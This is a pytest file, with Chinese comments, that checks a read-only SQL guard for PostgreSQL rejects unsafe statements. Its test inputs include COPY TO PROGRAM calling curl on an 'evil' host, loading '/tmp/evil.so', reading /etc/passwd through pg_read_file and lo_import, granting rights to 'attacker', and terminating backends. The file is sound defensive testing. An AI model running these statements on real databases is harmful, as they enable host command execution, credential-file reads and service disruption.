"""PostgreSQL 方言护栏测试（二十二期 spec D12）：增量黑名单与 AST 结构拒绝。

通用黑名单与四层 fail-closed 结构由 tests/exec/test_exec.py 锁定（引擎无关）；
本文件只锁 postgres 增量面（COPY/DO/LISTEN/NOTIFY 等 + pg_* 函数族 + 锁子句）。
"""

from __future__ import annotations

import pytest

from exec.guards import UnsafeSqlError, assert_read_only_sql


@pytest.mark.parametrize(
    "sql",
    [
        "COPY order_detail TO '/tmp/x.csv'",  # 写服务器文件
        "COPY order_detail TO PROGRAM 'curl http://evil'",  # 宿主命令执行（PG 侧最危险面）
        "LISTEN channel",
        "NOTIFY channel",
        "DO $$ BEGIN PERFORM 1; END $$;",
        "LOAD '/tmp/evil.so'",  # PG 动态加载共享库
        "REINDEX TABLE order_detail",
        "CLUSTER order_detail",
        "GRANT SELECT ON order_detail TO attacker",
        "REVOKE SELECT ON order_detail FROM dataagent_ro",
    ],
)
def test_postgres_extra_keywords_rejected(sql):
    with pytest.raises(UnsafeSqlError):
        assert_read_only_sql(sql, dialect="postgres")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT pg_sleep(10)",
        "SELECT pg_sleep_for('10 minutes')",
        "SELECT pg_terminate_backend(1234)",
        "SELECT pg_cancel_backend(1234)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT pg_ls_dir('/tmp')",
        "SELECT pg_advisory_lock(1)",
        "SELECT * FROM dblink('host=x dbname=y', 'SELECT 1') AS t(a int)",
        "SELECT lo_import('/etc/passwd')",
        "SELECT lo_export(r, '/tmp/x')",
    ],
)
def test_postgres_extra_functions_rejected(sql):
    with pytest.raises(UnsafeSqlError):
        assert_read_only_sql(sql, dialect="postgres")


def test_postgres_select_for_update_rejected():
    """postgres 方言拒绝锁子句（fail-closed 任一防线承担）。

    实际拦截点：语句级关键字黑名单先命中 UPDATE（通用层）；AST 层
    exp.Lock 拒绝（dialect 含 postgres）作为关键字清单演进时的兜底——
    两者任一生效即满足 spec D12 的拒绝要求。
    """
    with pytest.raises(UnsafeSqlError):
        assert_read_only_sql("SELECT * FROM order_detail FOR UPDATE", dialect="postgres")


def test_postgres_plain_select_allowed():
    """白名单正路不受增量黑名单误伤。"""
    assert_read_only_sql(
        "SELECT order_id, split_total_amount FROM order_detail WHERE order_status = '已支付'",
        dialect="postgres",
    )


def test_postgres_dialect_extras_registered():
    """方言增量登记存在（防手滑漏登记；语句级拒绝由四层防线任一承担）。"""
    from exec.guards import _DIALECT_EXTRA_FUNC_RE, _DIALECT_EXTRA_KEYWORDS

    assert "postgres" in _DIALECT_EXTRA_KEYWORDS
    assert "COPY" in _DIALECT_EXTRA_KEYWORDS["postgres"]
    assert "postgres" in _DIALECT_EXTRA_FUNC_RE
    assert _DIALECT_EXTRA_FUNC_RE["postgres"].search("SELECT pg_sleep(1)")
